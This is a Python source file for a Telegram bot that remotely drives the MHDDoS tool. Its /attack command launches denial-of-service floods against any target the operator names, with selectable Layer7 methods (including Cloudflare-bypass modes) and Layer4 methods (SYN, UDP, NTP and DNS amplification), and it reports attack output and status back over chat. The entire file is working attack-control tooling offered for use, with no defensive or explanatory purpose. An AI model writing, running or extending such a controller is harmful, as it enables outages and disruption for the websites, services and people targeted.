import os
import logging
import subprocess
import time
from typing import Dict, Optional, List, Tuple
import signal
import re
from functools import wraps

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, filters

# Configuration
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot token
AUTHORIZED_USER_ID = 0000000000  # Replace with your Telegram user ID
MHDDOS_PATH = "PATH_TO_MHDDOS_DIRECTORY"  # Replace with path to MHDDoS directory

# Set up logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Store running attack processes
running_attacks: Dict[str, Tuple[subprocess.Popen, str]] = {}

def authorized_only(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id != AUTHORIZED_USER_ID:
            await update.message.reply_text("Unauthorized access denied.")
            logger.warning(f"Unauthorized access attempt by user ID: {user_id}")
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

@authorized_only
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    await update.message.reply_text(
        "MHDDoS Telegram Controller Bot\n\n"
        "Commands:\n"
        "/attack [target] [method] [threads] [duration] - Start an attack\n"
        "/stop - Stop all running attacks\n"
        "/status - Show running attacks\n"
        "/methods - List available attack methods\n"
        "/help - Show this help message"
    )

@authorized_only
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start an attack with the MHDDoS tool."""
    if not context.args or len(context.args) < 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: /attack [target] [method] [threads] [duration]"
        )
        return

    target = context.args[0]
    method = context.args[1].upper()
    
    # Validate threads and duration are integers
    try:
        threads = int(context.args[2])
        duration = int(context.args[3])
    except ValueError:
        await update.message.reply_text("❌ Threads and duration must be integers.")
        return
    
    # Validate target URL format for Layer7 attacks
    if method in get_layer7_methods() and not target.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Target URL must start with http:// or https://")
        return
        
    # Create a unique ID for this attack
    attack_id = f"{method}-{int(time.time())}"
    
    # Notify user that attack is starting
    await update.message.reply_text(f"⚡ Starting {method} attack on {target}...\n"
                                   f"Threads: {threads}\n"
                                   f"Duration: {duration} seconds\n"
                                   f"Attack ID: {attack_id}")
    
    try:
        # Change to the MHDDoS directory
        os.chdir(MHDDOS_PATH)
        
        # Prepare the command
        cmd = ["python3", "start.py", method, target, str(threads), "0", "0", str(duration)]
        
        # Start the process
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        # Store the process
        running_attacks[attack_id] = (process, target)
        
        # Send confirmation message
        await update.message.reply_text(f"✅ Attack {attack_id} started successfully!")
        
        # Start collecting output
        await collect_output(update, context, process, attack_id, duration)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting attack: {str(e)}")
        logger.error(f"Attack error: {str(e)}")

async def collect_output(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                         process: subprocess.Popen, attack_id: str, duration: int) -> None:
    """Collect and send output from the attack process."""
    if process.stdout is None:
        return
    
    # Set a maximum time to wait for output (slightly longer than attack duration)
    max_wait_time = duration + 10
    start_time = time.time()
    
    output_buffer = []
    last_send_time = time.time()
    
    # Send initial status message
    status_message = await update.message.reply_text(f"📊 Attack {attack_id} - Collecting output...")
    
    try:
        while process.poll() is None and (time.time() - start_time) < max_wait_time:
            # Read from stdout without blocking
            line = process.stdout.readline()
            if line:
                output_buffer.append(line.strip())
                
                # Send output every 5 seconds if we have new content
                current_time = time.time()
                if current_time - last_send_time >= 5 and output_buffer:
                    # Take the last 15 lines to avoid message too long errors
                    output_text = "\n".join(output_buffer[-15:])
                    await status_message.edit_text(f"📊 Attack {attack_id} - Output:\n```\n{output_text}\n```", 
                                                parse_mode="Markdown")
                    last_send_time = current_time
            
            # Small sleep to prevent CPU hogging
            await asyncio.sleep(0.1)
        
        # Final output update
        if output_buffer:
            output_text = "\n".join(output_buffer[-15:])
            await status_message.edit_text(f"📊 Attack {attack_id} - Final Output:\n```\n{output_text}\n```", 
                                         parse_mode="Markdown")
        
        # If process is still running after duration, terminate it
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            await update.message.reply_text(f"✅ Attack {attack_id} completed after {duration} seconds.")
        
        # Clean up
        if attack_id in running_attacks:
            del running_attacks[attack_id]
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error monitoring attack {attack_id}: {str(e)}")
        logger.error(f"Monitor error: {str(e)}")

@authorized_only
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Stop all running attacks."""
    if not running_attacks:
        await update.message.reply_text("✅ No attacks are currently running.")
        return
    
    attack_count = len(running_attacks)
    
    for attack_id, (process, target) in list(running_attacks.items()):
        try:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            del running_attacks[attack_id]
        except Exception as e:
            await update.message.reply_text(f"❌ Error stopping attack {attack_id}: {str(e)}")
            logger.error(f"Stop error: {str(e)}")
    
    await update.message.reply_text(f"✅ Stopped {attack_count} running attack(s).")

@authorized_only
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the status of running attacks."""
    if not running_attacks:
        await update.message.reply_text("✅ No attacks are currently running.")
        return
    
    status_message = "🔄 Running Attacks:\n\n"
    
    for attack_id, (process, target) in running_attacks.items():
        if process.poll() is None:
            status = "Running"
        else:
            status = f"Finished (code: {process.returncode})"
            
        status_message += f"ID: {attack_id}\n"
        status_message += f"Target: {target}\n"
        status_message += f"Status: {status}\n\n"
    
    await update.message.reply_text(status_message)

@authorized_only
async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all available attack methods."""
    layer7_methods = get_layer7_methods()
    layer4_methods = get_layer4_methods()
    
    methods_message = "📋 Available Attack Methods:\n\n"
    
    methods_message += "💣 Layer7 Methods:\n"
    methods_message += ", ".join(layer7_methods) + "\n\n"
    
    methods_message += "🧨 Layer4 Methods:\n"
    methods_message += ", ".join(layer4_methods)
    
    await update.message.reply_text(methods_message)

@authorized_only
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a help message when the command /help is issued."""
    await start_command(update, context)

def get_layer7_methods() -> List[str]:
    """Return a list of Layer7 attack methods."""
    return [
        "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER", 
        "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", 
        "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB", 
        "KILLER", "TOR"
    ]

def get_layer4_methods() -> List[str]:
    """Return a list of Layer4 attack methods."""
    return [
        "TCP", "UDP", "SYN", "CPS", "ICMP", "CONNECTION", "VSE", "TS3",
        "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE", "DNS", "CHAR",
        "CLDAP", "ARD", "RDP"
    ]

def main() -> None:
    """Start the bot."""
    # Create the Application
    application = Application.builder().token(TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("methods", methods_command))

    # Run the bot until the user presses Ctrl-C
    application.run_polling()

if __name__ == "__main__":
    # Import asyncio here to avoid circular imports
    import asyncio
    main() 